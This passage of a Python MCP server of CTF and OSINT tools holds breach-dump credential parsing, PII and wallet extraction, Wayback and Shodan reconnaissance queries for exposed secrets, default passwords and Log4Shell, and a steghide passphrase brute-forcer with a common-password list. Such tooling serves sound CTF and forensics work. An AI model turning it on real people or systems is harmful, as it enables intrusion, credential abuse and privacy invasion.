        text: Any freeform text from a social media profile, post, or bio.

    Returns:
        Extracted indicators grouped by type with notes.
    """
    lines = ["=== Social Media Text Analysis ===\n"]

    # Emails
    emails = re.findall(r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}", text)
    if emails:
        lines.append("--- Emails ---")
        for e in set(emails):
            lines.append(f"  {e}")
        lines.append("")

    # Phone numbers
    phones = re.findall(
        r"(?:\+?1[-.\s]?)?(?:\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4})"
        r"|(?:\+\d{1,3}[-.\s]?\d{1,14}(?:[-.\s]\d{1,13})?)",
        text
    )
    if phones:
        lines.append("--- Phone Numbers ---")
        for p in set(phones):
            lines.append(f"  {p.strip()}")
        lines.append("")

    # URLs
    urls = re.findall(r"https?://[^\s\"'<>]+", text)
    if urls:
        lines.append("--- URLs ---")
        for u in set(urls):
            lines.append(f"  {u}")
        lines.append("")

    # Handles / usernames (@mention style)
    handles = re.findall(r"@[\w.]{2,30}", text)
    if handles:
        lines.append("--- Handles / Mentions ---")
        for h in set(handles):
            lines.append(f"  {h}")
        lines.append("")

    # Hashtags
    hashtags = re.findall(r"#[\w]{2,40}", text)
    if hashtags:
        lines.append("--- Hashtags ---")
        for h in set(hashtags):
            lines.append(f"  {h}")
        lines.append("")

    # Dates
    dates = re.findall(
        r"\b(?:\d{1,2}[/\-]\d{1,2}[/\-]\d{2,4}"
        r"|\d{4}[/\-]\d{1,2}[/\-]\d{1,2}"
        r"|(?:Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)[a-z]*\.?\s+\d{1,2},?\s+\d{4})\b",
        text, re.IGNORECASE
    )
    if dates:
        lines.append("--- Dates ---")
        for d in set(dates):
            lines.append(f"  {d}")
        lines.append("")

    # IP addresses
    ips = re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", text)
    if ips:
        lines.append("--- IP Addresses ---")
        for ip in set(ips):
            lines.append(f"  {ip}")
        lines.append("")

    # Crypto wallet addresses (BTC/ETH hints)
    btc = re.findall(r"\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b|\bbc1[ac-hj-np-z02-9]{11,71}\b", text)
    eth = re.findall(r"\b0x[a-fA-F0-9]{40}\b", text)
    if btc or eth:
        lines.append("--- Crypto Wallets ---")
        for w in set(btc):
            lines.append(f"  BTC: {w}")
        for w in set(eth):
            lines.append(f"  ETH: {w}")
        lines.append("")

    # Potential PII keywords
    pii_keywords = re.findall(
        r"\b(?:passport|ssn|social security|date of birth|dob|address|zip code|license)\b",
        text, re.IGNORECASE
    )
    if pii_keywords:
        lines.append("--- PII Indicators ---")
        for k in set(k.lower() for k in pii_keywords):
            lines.append(f"  ★ {k}")
        lines.append("")

    if len(lines) == 2:
        lines.append("No notable OSINT indicators found in the provided text.")

    return "\n".join(lines)


@mcp.tool()
def osint_breach_pattern_search(text: str) -> str:
    """Search text (breach dump, paste, credential list) for patterns and stats.

    Args:
        text: Raw text content from a credential dump, paste, or data breach sample.

    Returns:
        Email domains, password patterns, credential pairs, hash types detected.
    """
    lines = ["=== Breach Dump Analysis ===\n"]

    # Email:password or username:password lines
    cred_pairs = re.findall(r"([a-zA-Z0-9._%+\-]+@[\w.\-]+\.[a-zA-Z]{2,}):(.+)", text)
    user_pass = re.findall(r"([a-zA-Z0-9_.\-]{3,32}):([^\s:]{4,64})", text)

    if cred_pairs:
        lines.append(f"--- Credential Pairs (email:pass) — {len(cred_pairs)} found ---")
        for email, pw in cred_pairs[:20]:
            lines.append(f"  {email} : {pw[:50]}")
        if len(cred_pairs) > 20:
            lines.append(f"  ... +{len(cred_pairs)-20} more")
        lines.append("")

        # Domain frequency
        from collections import Counter
        domains = Counter(e.split("@")[1].lower() for e, _ in cred_pairs)
        lines.append("--- Email Domain Frequency ---")
        for domain, count in domains.most_common(15):
            lines.append(f"  {count:>5}x  {domain}")
        lines.append("")

        # Password analysis
        passwords = [pw for _, pw in cred_pairs]
        lengths = [len(pw) for pw in passwords]
        lines.append("--- Password Stats ---")
        lines.append(f"  Count  : {len(passwords)}")
        lines.append(f"  Min len: {min(lengths)}")
        lines.append(f"  Max len: {max(lengths)}")
        lines.append(f"  Avg len: {sum(lengths)/len(lengths):.1f}")
        common_pw = Counter(passwords).most_common(10)
        lines.append("  Most common:")
        for pw, cnt in common_pw:
            lines.append(f"    {cnt:>4}x  {pw[:50]}")
        lines.append("")

    # Hash detection
    HASH_PATTERNS = [
        (r"\b[0-9a-fA-F]{32}\b", "MD5"),
        (r"\b[0-9a-fA-F]{40}\b", "SHA1"),
        (r"\b[0-9a-fA-F]{64}\b", "SHA256"),
        (r"\b[0-9a-fA-F]{128}\b", "SHA512"),
        (r"\$2[aby]\$\d+\$[./A-Za-z0-9]{53}", "bcrypt"),
        (r"\$6\$[./A-Za-z0-9]{8,16}\$[./A-Za-z0-9]{86}", "SHA512crypt"),
        (r"\$1\$[./A-Za-z0-9]{8}\$[./A-Za-z0-9]{22}", "MD5crypt"),
        (r"\$apr1\$[./A-Za-z0-9]{8}\$[./A-Za-z0-9]{22}", "APR1"),
        (r"[A-Za-z0-9+/]{43}=", "SHA256 base64"),
    ]
    hash_hits: list[str] = []
    for pattern, name in HASH_PATTERNS:
        hits = re.findall(pattern, text)
        if hits:
            hash_hits.append(f"  {name}: {len(hits)} found — sample: {hits[0][:60]}")
    if hash_hits:
        lines.append("--- Hash Types Detected ---")
        lines.extend(hash_hits)
        lines.append("")

    # Emails found (general)
    all_emails = re.findall(r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}", text)
    if all_emails and not cred_pairs:
        lines.append(f"--- Email Addresses ({len(all_emails)}) ---")
        for e in list(set(all_emails))[:20]:
            lines.append(f"  {e}")
        lines.append("")

    # Stats
    lines.append("--- Text Stats ---")
    lines.append(f"  Total chars : {len(text)}")
    lines.append(f"  Total lines : {text.count(chr(10))}")
    lines.append(f"  Emails found: {len(all_emails)}")

    return _truncate("\n".join(lines), 8192)


@mcp.tool()
def osint_wayback_urls(domain: str, limit: int = 50) -> str:
    """Retrieve archived URLs for a domain from the Wayback Machine CDX API.

    Args:
        domain: Target domain (e.g. example.com).
        limit: Maximum number of URLs to return (default 50).

    Returns:
        Archived URLs with timestamps, sorted by date; highlights interesting paths.
    """
    import warnings
    try:
        import requests
    except ImportError:
        return "requests library not available."

    warnings.filterwarnings("ignore")

    try:
        r = requests.get(
            "http://web.archive.org/cdx/search/cdx",
            params={
                "url": f"*.{domain}/*",
                "output": "json",
                "fl": "timestamp,original,statuscode,mimetype",
                "collapse": "urlkey",
                "limit": limit,
                "filter": "statuscode:200",
            },
            timeout=15,
            headers={"User-Agent": "Mozilla/5.0 (CTF-OSINT)"},
        )
    except Exception as exc:
        return f"Wayback Machine request failed: {exc}"

    if r.status_code != 200:
        return f"Wayback CDX API returned {r.status_code}"

    try:
        data = r.json()
    except Exception:
        return "Failed to parse Wayback CDX response."

    if len(data) <= 1:
        return f"No archived URLs found for {domain}."

    headers_row = data[0]
    rows = data[1:]

    interesting_keywords = ["admin", "login", "password", "config", "backup",
                            "api", ".env", ".git", "secret", "token", "debug",
                            "upload", "internal", "test", "dev", "staging"]

    lines = [f"=== Wayback Machine URLs: {domain} ===",
             f"Results: {len(rows)} (limit: {limit})", ""]

    interesting = []
    for row in rows:
        if len(row) >= 4:
            ts, url, status, mime = row[0], row[1], row[2], row[3]
            year = ts[:4] if len(ts) >= 4 else "????"
            line = f"  [{year}] [{status}] {url}"
            lines.append(line)
            if any(kw in url.lower() for kw in interesting_keywords):
                interesting.append(url)

    if interesting:
        lines.append(f"\n=== Interesting URLs ({len(interesting)}) ===")
        for u in interesting:
            lines.append(f"  ★ {u}")

    lines.append(f"\n=== Wayback Archive Link ===")
    lines.append(f"  https://web.archive.org/web/*/{domain}")

    return _truncate("\n".join(lines), 8192)


@mcp.tool()
def osint_shodan_query_builder(target: str, query_type: str = "host") -> str:
    """Build Shodan search queries for a target IP, domain, or technology.

    Args:
        target: IP address, domain, organization name, or technology string.
        query_type: "host", "org", "domain", "tech", "vuln", or "asn".

    Returns:
        Ready-to-use Shodan search queries with explanations.
    """
    lines = [f"=== Shodan Query Builder: {target} ===\n"]

    QUERIES: dict[str, list[tuple[str, str]]] = {
        "host": [
            (f"ip:{target}", "Direct host lookup"),
            (f"ip:{target} port:22", "SSH on this IP"),
            (f"ip:{target} port:80,443,8080,8443", "Web ports"),
            (f"ip:{target} product:Apache", "Apache on this IP"),
            (f"ip:{target} vuln:CVE-2021-44228", "Log4Shell on this IP"),
        ],
        "org": [
            (f'org:"{target}"', "Hosts by organization"),
            (f'org:"{target}" port:22', "SSH in org"),
            (f'org:"{target}" port:3389', "RDP in org"),
            (f'org:"{target}" port:445', "SMB in org"),
            (f'org:"{target}" http.title:"Index of"', "Directory listings in org"),
            (f'org:"{target}" "default password"', "Default passwords in org"),
        ],
        "domain": [
            (f"hostname:{target}", "All subdomains"),
            (f"hostname:.{target}", "All subdomains (wildcard)"),
            (f'ssl.cert.subject.cn:"{target}"', "TLS cert common name"),
            (f'ssl.cert.subject.cn:"*.{target}"', "Wildcard TLS certs"),
            (f'http.html:"{target}"', "HTML mentioning domain"),
            (f'http.headers.location:"{target}"', "Redirects to domain"),
        ],
        "tech": [
            (f"product:{target}", "By product name"),
            (f"technology:{target}", "By technology"),
            (f'http.server:"{target}"', "By Server header"),
            (f'http.title:"{target}"', "By page title"),
            (f'http.html:"{target}"', "HTML containing text"),
            (f'banner:"{target}"', "By service banner"),
        ],
        "vuln": [
            (f"vuln:{target}", "Hosts with this CVE"),
            (f"vuln:{target} port:443", "HTTPS + this CVE"),
            (f'vuln:{target} country:"US"', "US hosts with this CVE"),
        ],
        "asn": [
            (f"asn:{target}", "All IPs in ASN"),
            (f"asn:{target} port:22", "SSH in ASN"),
            (f"asn:{target} port:80,443", "Web in ASN"),
            (f"asn:{target} product:nginx", "Nginx in ASN"),
        ],
    }

    qt = query_type.lower()
    if qt not in QUERIES:
        avail = ", ".join(sorted(QUERIES.keys()))
        return f"Unknown query_type '{query_type}'. Available: {avail}"

    queries = QUERIES[qt]
    lines.append(f"Query type: {qt}\n")
    for q, desc in queries:
        lines.append(f"  # {desc}")
        lines.append(f"  {q}")
        lines.append("")

    lines.append("=== How to Use ===")
    lines.append("  Web UI : https://www.shodan.io/search?query=<query>")
    lines.append("  CLI    : shodan search '<query>'  (shodan init <api_key> first)")
    lines.append("  API    : https://api.shodan.io/shodan/host/search?key=KEY&query=<query>")
    lines.append("  Free   : 2 pages of results without API key")
    lines.append("  Paid   : shodan.io/products for export / monitor features")

    return "\n".join(lines)


@mcp.tool()
def osint_ctf_flag_hunt(text: str, custom_pattern: str = "") -> str:
    """Hunt for CTF flags and secrets in freeform text or file contents.

    Args:
        text: Any text to search — webpage source, binary strings output, etc.
        custom_pattern: Optional extra regex pattern to search for.

    Returns:
        All flag matches, base64 blobs, hex strings, and suspicious patterns.
    """
    lines = ["=== CTF Flag Hunt ===\n"]

    # Common flag formats
    FLAG_PATTERNS = [
        (r"flag\{[^}]+\}", "Generic flag{}"),
        (r"CTF\{[^}]+\}", "CTF{}"),
        (r"FLAG\{[^}]+\}", "FLAG{}"),
        (r"picoCTF\{[^}]+\}", "picoCTF{}"),
        (r"HTB\{[^}]+\}", "HackTheBox{}"),
        (r"THM\{[^}]+\}", "TryHackMe{}"),
        (r"DUCTF\{[^}]+\}", "DownUnderCTF{}"),
        (r"pbctf\{[^}]+\}", "pbctf{}"),
        (r"BCACTF\{[^}]+\}", "BCACTF{}"),
        (r"darkCTF\{[^}]+\}", "darkCTF{}"),
        (r"utflag\{[^}]+\}", "utflag{}"),
        (r"uiuctf\{[^}]+\}", "uiuctf{}"),
        (r"castorsctf\{[^}]+\}", "castorsctf{}"),
        (r"[a-zA-Z0-9_]{2,10}\{[A-Za-z0-9_\-+/=!@#$%^&*(),.?:; ]{4,80}\}", "Generic {FLAG} pattern"),
    ]

    flag_hits = []
    for pattern, name in FLAG_PATTERNS:
        hits = re.findall(pattern, text, re.IGNORECASE)
        for h in hits:
            flag_hits.append((name, h))

    if flag_hits:
        lines.append("--- Flag Matches ---")
        for name, hit in flag_hits:
            lines.append(f"  [{name}] {hit}")
        lines.append("")

    # Base64 blobs (long ones likely encoded data)
    b64_hits = re.findall(r"[A-Za-z0-9+/]{20,}={0,2}", text)
    decoded_b64 = []
    for blob in b64_hits[:20]:
        try:
            decoded = base64.b64decode(blob + "==").decode("utf-8", errors="replace")
            # Only show if decoded looks printable
            printable_ratio = sum(32 <= ord(c) < 127 for c in decoded) / max(len(decoded), 1)
            if printable_ratio > 0.7:
                decoded_b64.append((blob[:40], decoded[:80]))
        except Exception:
            pass

    if decoded_b64:
        lines.append("--- Base64 Blobs (decoded) ---")
        for blob, dec in decoded_b64:
            lines.append(f"  {blob}...")
            lines.append(f"    → {dec}")
        lines.append("")

    # Hex strings
    hex_hits = re.findall(r"(?:[0-9a-fA-F]{2}){8,}", text)
    interesting_hex = []
    for h in hex_hits[:10]:
        try:
            decoded = bytes.fromhex(h).decode("utf-8", errors="replace")
            printable_ratio = sum(32 <= ord(c) < 127 for c in decoded) / max(len(decoded), 1)
            if printable_ratio > 0.6:
                interesting_hex.append((h[:40], decoded[:80]))
        except Exception:
            pass

    if interesting_hex:
        lines.append("--- Hex Strings (decoded) ---")
        for h, dec in interesting_hex:
            lines.append(f"  {h}...")
            lines.append(f"    → {dec}")
        lines.append("")

    # ROT13 of flag patterns
    rot13_hits = re.findall(r"[A-Za-z]{20,}", text)
    for word in rot13_hits[:30]:
        rot = codecs.encode(word, "rot_13")
        if re.search(r"flag|ctf|htb|thm|picoctf", rot, re.IGNORECASE):
            lines.append(f"--- ROT13 Flag Found ---")
            lines.append(f"  Original : {word}")
            lines.append(f"  ROT13    : {rot}")
            lines.append("")

    # Custom pattern
    if custom_pattern:
        try:
            custom_hits = re.findall(custom_pattern, text, re.IGNORECASE)
            if custom_hits:
                lines.append(f"--- Custom Pattern ({custom_pattern}) ---")
                for h in custom_hits[:20]:
                    lines.append(f"  {h}")
                lines.append("")
        except re.error as exc:
            lines.append(f"Invalid custom pattern: {exc}")

    # URLs with potential flag data
    urls_with_data = re.findall(r"https?://[^\s\"']+[?&][^\s\"']+", text)
    if urls_with_data:
        lines.append("--- URLs with Query Params ---")
        for u in urls_with_data[:10]:
            lines.append(f"  {u}")
        lines.append("")

    if not flag_hits and not decoded_b64 and not interesting_hex:
        lines.append("No obvious flags or encoded data found.")
        lines.append("Try: re_find_strings_pattern, crypto_xor_bruteforce, or blue_decode_layers.")

    return _truncate("\n".join(lines), 8192)


# ===========================================================================
# FORENSICS TOOLBOX
# ===========================================================================

@mcp.tool()
def forens_file_identify(path: str) -> str:
    """Deep file identification — magic bytes, file type, MIME, entropy, headers.

    Args:
        path: Path to file (relative to workspace).

    Returns:
        Magic bytes, file/MIME type, entropy rating, hex header, and format notes.
    """
    safe = _safe_path(path)

    # file command
    file_out = _run(["file", "-b", "--mime-type", str(safe)], timeout=10)
    file_verbose = _run(["file", "-b", str(safe)], timeout=10)

    # Read header bytes
    try:
        data = safe.read_bytes()
    except FileNotFoundError:
        return f"File not found: {path}"

    header = data[:64]
    hex_header = " ".join(f"{b:02x}" for b in header)
    ascii_header = "".join(chr(b) if 32 <= b < 127 else "." for b in header)

    # Entropy
    import math
    freq: dict[int, int] = {}
    for b in data:
        freq[b] = freq.get(b, 0) + 1
    entropy = 0.0
    for count in freq.values():
        p = count / len(data)
        if p > 0:
            entropy -= p * math.log2(p)
    entropy_rating = (
        "Very low — plaintext/sparse" if entropy < 2 else
        "Low — text/structured data" if entropy < 4 else
        "Medium — mixed content" if entropy < 6 else
        "High — compressed/encrypted/packed" if entropy < 7.5 else
        "Very high — likely encrypted or compressed"
    )

    # Known magic signatures
    MAGIC: list[tuple[bytes, str]] = [
        (b"\x89PNG\r\n\x1a\n", "PNG image"),
        (b"\xff\xd8\xff", "JPEG image"),
        (b"GIF87a", "GIF87a image"), (b"GIF89a", "GIF89a image"),
        (b"BM", "BMP image"),
        (b"RIFF", "RIFF container (WAV/AVI/WebP)"),
        (b"ftyp", "MP4/M4A/MOV container"),
        (b"\x1a\x45\xdf\xa3", "Matroska/WebM"),
        (b"ID3", "MP3 (ID3 tag)"), (b"\xff\xfb", "MP3 audio"),
        (b"OggS", "OGG container"),
        (b"fLaC", "FLAC audio"),
        (b"PK\x03\x04", "ZIP archive (or DOCX/XLSX/PPTX/JAR/APK)"),
        (b"PK\x05\x06", "ZIP archive (empty)"),
        (b"\x1f\x8b", "GZIP compressed"),
        (b"BZh", "BZIP2 compressed"),
        (b"\xfd7zXZ\x00", "XZ compressed"),
        (b"7z\xbc\xaf'\x1c", "7-Zip archive"),
        (b"Rar!\x1a\x07", "RAR archive"),
        (b"\x4c\x5a\x49\x50", "LZIP"),
        (b"%PDF", "PDF document"),
        (b"\xd0\xcf\x11\xe0", "MS Office (OLE2/DOC/XLS/PPT)"),
        (b"\x7fELF", "ELF executable"),
        (b"MZ", "PE/DOS executable"),
        (b"\xca\xfe\xba\xbe", "Mach-O universal binary (big-endian)"),
        (b"\xce\xfa\xed\xfe", "Mach-O 32-bit (little-endian)"),
        (b"\xcf\xfa\xed\xfe", "Mach-O 64-bit (little-endian)"),
        (b"\x30\x82", "DER encoded certificate/key"),
        (b"-----BEGIN", "PEM encoded data"),
        (b"SQLite format 3", "SQLite3 database"),
        (b"\x00\x00\x00\x0cjP  \r\n\x87\n", "JPEG 2000"),
        (b"IHDR", "PNG chunk"),
        (b"\x49\x49\x2a\x00", "TIFF (little-endian)"),
        (b"\x4d\x4d\x00\x2a", "TIFF (big-endian)"),
        (b"<!DOCTYPE html", "HTML document"),
        (b"<html", "HTML document"),
        (b"<?xml", "XML document"),
        (b"#!/", "Script (shebang)"),
        (b"\xef\xbb\xbf", "UTF-8 BOM"),
        (b"\xff\xfe", "UTF-16 LE BOM"),
        (b"\xfe\xff", "UTF-16 BE BOM"),
        (b"CAFEBABE", "Java class (wrong endian — check)"),
        (b"\xca\xfe\xba\xbe", "Java .class file"),
        (b"dex\n", "Android DEX bytecode"),
        (b"ANDROID BACKUP", "Android backup"),
        (b"\x50\x4b\x03\x04", "ZIP/APK/JAR"),
        (b"OAT\n", "Android OAT file"),
        (b"\x21\x3c\x61\x72\x63\x68\x3e\x0a", "AR archive (.a)"),
        (b"\x1f\x9d", "compress'd data (LZW)"),
        (b"PCAP", "PCAP capture"), (b"\xd4\xc3\xb2\xa1", "PCAP (little-endian)"),
        (b"\x0a\x0d\x0d\x0a", "PCAPNG capture"),
        (b"WAD", "Doom WAD file"),
        (b"VMDK", "VMware disk"),
        (b"conectix", "VHD disk"),
        (b"cdrw", "VMDK sparse extent"),
    ]
    matched_magic = []
    for sig, name in MAGIC:
        if data[:len(sig)] == sig or sig in data[:32]:
            matched_magic.append(name)

    lines = [
        f"=== File Identification: {path} ===",
        f"Size       : {len(data):,} bytes ({len(data)/1024:.1f} KB)",
        f"MIME Type  : {file_out.strip()}",
        f"file -b    : {file_verbose.strip()}",
        f"Entropy    : {entropy:.4f} / 8.0  ({entropy_rating})",
        f"",
        f"--- Magic Bytes (first 64 bytes) ---",
        f"  Hex  : {hex_header}",
        f"  ASCII: {ascii_header}",
        f"",
    ]
    if matched_magic:
        lines.append("--- Signature Matches ---")
        for m in matched_magic:
            lines.append(f"  ✓ {m}")
        lines.append("")

    # Strings preview
    strings_out = _run(["strings", "-n", "6", str(safe)], timeout=10)
    preview = "\n".join(strings_out.splitlines()[:20])
    lines.append("--- Strings Preview (first 20) ---")
    lines.append(preview or "(none)")

    return "\n".join(lines)


@mcp.tool()
def forens_strings_extract(path: str, min_len: int = 4, encoding: str = "all",
                           limit: int = 200) -> str:
    """Extract printable strings from any file.

    Args:
        path: Path to file (relative to workspace).
        min_len: Minimum string length (default 4).
        encoding: "ascii", "unicode", or "all" (default).
        limit: Maximum strings to return (default 200).

    Returns:
        All extracted strings, flagging potential flags, credentials, and URLs.
    """
    safe = _safe_path(path)

    args = ["strings", f"-n{min_len}"]
    if encoding == "unicode":
        args += ["-el"]
    elif encoding == "all":
        args += ["-a"]
    args.append(str(safe))

    out = _run(args, timeout=20)
    all_strings = out.splitlines()

    # Categorise interesting strings
    flags, urls, creds, paths, interesting = [], [], [], [], []
    for s in all_strings:
        sl = s.lower()
        if re.search(r"[a-zA-Z0-9_]{2,10}\{[^}]{3,60}\}", s):
            flags.append(s)
        elif re.match(r"https?://", s):
            urls.append(s)
        elif any(k in sl for k in ("password", "passwd", "secret", "token", "api_key", "apikey", "auth")):
            creds.append(s)
        elif re.match(r"[/\\][a-zA-Z0-9_./\\]{4,}", s):
            paths.append(s)
        elif any(k in sl for k in ("flag", "admin", "root", "key", "login", "user", "pass", "cmd", "exec")):
            interesting.append(s)

    lines = [f"=== Strings: {path} ===",
             f"Total strings: {len(all_strings)}  (min_len={min_len}, enc={encoding})", ""]

    if flags:
        lines.append("--- Possible Flags ---")
        for s in flags:
            lines.append(f"  ★ {s}")
        lines.append("")
    if creds:
        lines.append("--- Credential-Related ---")
        for s in creds[:20]:
            lines.append(f"  ★ {s}")
        lines.append("")
    if urls:
        lines.append("--- URLs ---")
        for s in urls[:20]:
            lines.append(f"  {s}")
        lines.append("")
    if interesting:
        lines.append("--- Interesting Keywords ---")
        for s in interesting[:30]:
            lines.append(f"  {s}")
        lines.append("")
    if paths:
        lines.append("--- File/Path Strings ---")
        for s in paths[:20]:
            lines.append(f"  {s}")
        lines.append("")

    lines.append(f"--- All Strings (first {limit}) ---")
    for s in all_strings[:limit]:
        lines.append(f"  {s}")
    if len(all_strings) > limit:
        lines.append(f"  ... and {len(all_strings) - limit} more (increase limit to see)")

    return _truncate("\n".join(lines), 8192)


@mcp.tool()
def forens_binwalk_scan(path: str, extract: bool = False) -> str:
    """Scan a file for embedded files and firmware signatures using binwalk.

    Args:
        path: Path to file (relative to workspace).
        extract: Whether to extract embedded files to /tmp/ctf/ (default False).

    Returns:
        Binwalk signature scan output and, if extract=True, extracted file listing.
    """
    safe = _safe_path(path)
    SCRATCH.mkdir(parents=True, exist_ok=True)

    # Signature scan
    scan_out = _run(["binwalk", str(safe)], timeout=30)

    lines = [f"=== Binwalk Scan: {path} ===\n",
             "--- Signature Scan ---",
             scan_out.strip() or "(no signatures found)"]

    if extract:
        extract_dir = SCRATCH / "binwalk_extract"
        extract_dir.mkdir(parents=True, exist_ok=True)
        ext_out = _run(["binwalk", "-e", "--directory", str(extract_dir), str(safe)], timeout=60)
        lines.append("\n--- Extraction Output ---")
        lines.append(ext_out.strip())

        # List extracted files
        list_out = _run(["find", str(extract_dir), "-type", "f"], timeout=10)
        lines.append("\n--- Extracted Files ---")
        lines.append(list_out.strip() or "(none)")
        lines.append(f"\nExtracted to: {extract_dir}")

    return _truncate("\n".join(lines), 8192)


@mcp.tool()
def forens_steghide_extract(path: str, passphrase: str = "") -> str:
    """Attempt steghide extraction from a JPEG/BMP/WAV/AU file.

    Args:
        path: Path to stego file (relative to workspace).
        passphrase: Passphrase to try (empty string = no passphrase).

    Returns:
        Extraction result and content of any extracted file.
    """
    safe = _safe_path(path)
    SCRATCH.mkdir(parents=True, exist_ok=True)
    out_file = SCRATCH / (safe.name + ".steghide_out")

    cmd = ["steghide", "extract", "-sf", str(safe),
           "-p", passphrase, "-f", "-xf", str(out_file)]
    result = _run(cmd, timeout=30)

    lines = [f"=== Steghide: {path} ===",
             f"Passphrase: '{passphrase}'",
             "",
             "--- Output ---",
             result.strip()]

    if out_file.exists():
        lines.append(f"\n--- Extracted File: {out_file.name} ---")
        try:
            content = out_file.read_text(errors="replace")
            lines.append(content[:2000])
            if len(content) > 2000:
                lines.append(f"... ({len(content)} chars total)")
        except Exception:
            raw = out_file.read_bytes()
            lines.append(f"Binary data ({len(raw)} bytes): {raw[:64].hex()}")
    else:
        lines.append("\nNo file extracted (wrong passphrase or no hidden data).")

    return "\n".join(lines)


@mcp.tool()
def forens_steghide_bruteforce(path: str, wordlist_path: str = "") -> str:
    """Brute-force steghide passphrase using a wordlist.

    Args:
        path: Path to stego file (relative to workspace).
        wordlist_path: Path to wordlist (relative to workspace). If empty,
                       uses a built-in mini wordlist of common CTF passphrases.

    Returns:
        Found passphrase (if any) and extracted content.
    """
    safe = _safe_path(path)
    SCRATCH.mkdir(parents=True, exist_ok=True)

    BUILTIN_WORDS = [
        "", "password", "secret", "steghide", "hidden", "flag", "ctf",
        "admin", "root", "1234", "12345", "123456", "password123",
        "abc123", "qwerty", "letmein", "welcome", "monkey", "dragon",
        "master", "pass", "test", "guest", "default", "changeme",
        "steg", "hide", "embed", "crypto", "magic", "challenge",
    ]

    if wordlist_path:
        wl_safe = _safe_path(wordlist_path)
        try:
            words = wl_safe.read_text(errors="replace").splitlines()
        except FileNotFoundError:
            return f"Wordlist not found: {wordlist_path}"
    else:
        words = BUILTIN_WORDS

    lines = [f"=== Steghide Bruteforce: {path} ===",
             f"Wordlist size: {len(words)} words", ""]

    for word in words[:500]:  # cap at 500 tries
        out_file = SCRATCH / (safe.name + ".bf_out")
        result = _run(
            ["steghide", "extract", "-sf", str(safe),
             "-p", word, "-f", "-xf", str(out_file)],
            timeout=10
        )
        if "extracted" in result.lower() and out_file.exists():
            lines.append(f"✓ PASSPHRASE FOUND: '{word}'")
            lines.append("")
            try:
                content = out_file.read_text(errors="replace")
                lines.append(f"--- Extracted Content ---\n{content[:2000]}")
            except Exception:
                raw = out_file.read_bytes()
                lines.append(f"Binary ({len(raw)} bytes): {raw[:64].hex()}")
            return "\n".join(lines)

    lines.append("No passphrase found in wordlist.")
    return "\n".join(lines)


@mcp.tool()
def forens_zsteg_scan(path: str) -> str:
    """Run zsteg on a PNG/BMP to detect LSB and other steganographic data.

    Args:
        path: Path to PNG or BMP file (relative to workspace).

    Returns:
        Full zsteg output including all bit-plane and channel combinations.
    """
    safe = _safe_path(path)
    out = _run(["zsteg", "-a", str(safe)], timeout=60)
    if not out.strip():
        return f"zsteg found nothing in {path}."
    return _truncate(f"=== zsteg: {path} ===\n\n" + out, 8192)


@mcp.tool()
def forens_exif_full(path: str) -> str:
    """Extract complete EXIF/metadata from any file using ExifTool.

    Args:
        path: Path to file (relative to workspace).

    Returns:
        All metadata fields grouped by category, with GPS coordinates decoded.
    """
    safe = _safe_path(path)
    out = _run(["exiftool", "-a", "-u", "-g1", "-sort", str(safe)], timeout=20)

    # GPS decode
    lat_match = re.search(r"GPS Latitude\s*:\s*([\d.]+)\s*(N|S)", out)
    lon_match = re.search(r"GPS Longitude\s*:\s*([\d.]+)\s*(E|W)", out)
    gps_line = ""
    if lat_match and lon_match:
        lat = float(lat_match.group(1)) * (-1 if lat_match.group(2) == "S" else 1)
        lon = float(lon_match.group(1)) * (-1 if lon_match.group(2) == "W" else 1)
        gps_line = (f"\n=== GPS Decoded ===\n"
                    f"  Coordinates : {lat:.6f}, {lon:.6f}\n"
                    f"  Google Maps : https://maps.google.com/?q={lat},{lon}\n"
                    f"  OSM         : https://www.openstreetmap.org/?mlat={lat}&mlon={lon}")

    return _truncate(f"=== ExifTool: {path} ===\n\n" + out.strip() + gps_line, 8192)


@mcp.tool()
def forens_hex_editor(path: str, offset: int = 0, length: int = 256,
                      search: str = "") -> str:
    """View and search file contents in hex+ASCII format.

    Args:
        path: Path to file (relative to workspace).
        offset: Start byte offset (default 0).
        length: Number of bytes to display (default 256, max 4096).
        search: Optional ASCII or hex string to search for (prefix "hex:" for hex).

    Returns:
        Hex+ASCII dump with optional search results and offsets.
    """
    safe = _safe_path(path)
    try:
        data = safe.read_bytes()
    except FileNotFoundError:
        return f"File not found: {path}"

    length = min(length, 4096)
    chunk = data[offset:offset + length]

    lines = [f"=== Hex View: {path} ===",
             f"File size: {len(data):,} bytes  |  Showing offset {offset}–{offset+len(chunk)}",
             ""]

    # Hex dump
    for i in range(0, len(chunk), 16):
        row = chunk[i:i + 16]
        hex_part = " ".join(f"{b:02x}" for b in row)
        asc_part = "".join(chr(b) if 32 <= b < 127 else "." for b in row)
        lines.append(f"{offset+i:08x}  {hex_part:<47}  |{asc_part}|")

    # Search
    if search:
        lines.append(f"\n--- Search: '{search}' ---")
        if search.startswith("hex:"):
            try:
                needle = bytes.fromhex(search[4:].replace(" ", ""))
            except ValueError as exc:
                return f"Invalid hex search string: {exc}"
        else:
            needle = search.encode("latin-1", errors="replace")

        offsets = []
        pos = 0
        while True:
            pos = data.find(needle, pos)
            if pos == -1:
                break
            offsets.append(pos)
            pos += 1

        if offsets:
            lines.append(f"  Found {len(offsets)} occurrence(s):")
            for o in offsets[:20]:
                ctx = data[max(0, o-4):o+len(needle)+8]
                ctx_hex = " ".join(f"{b:02x}" for b in ctx)
                lines.append(f"  offset 0x{o:08x} ({o}) → context: {ctx_hex}")
        else:
            lines.append(f"  Not found in file.")

    return "\n".join(lines)


@mcp.tool()
def forens_carve_files(path: str) -> str:
    """Carve embedded files from a binary using magic byte signatures.

    Searches for file headers (JPEG, PNG, PDF, ZIP, etc.) and reports their
    offsets and sizes so you can extract them with forens_extract_chunk.

    Args:
        path: Path to file or disk image (relative to workspace).

    Returns:
        List of carved file candidates with offset, size, and type.
    """
    safe = _safe_path(path)
    try:
        data = safe.read_bytes()
    except FileNotFoundError:
        return f"File not found: {path}"

    SIGNATURES: list[tuple[bytes, bytes | None, str]] = [
        (b"\xff\xd8\xff", b"\xff\xd9", "JPEG"),
        (b"\x89PNG\r\n\x1a\n", b"IEND\xaeB`\x82", "PNG"),
        (b"GIF87a", b"\x00\x3b", "GIF87a"),
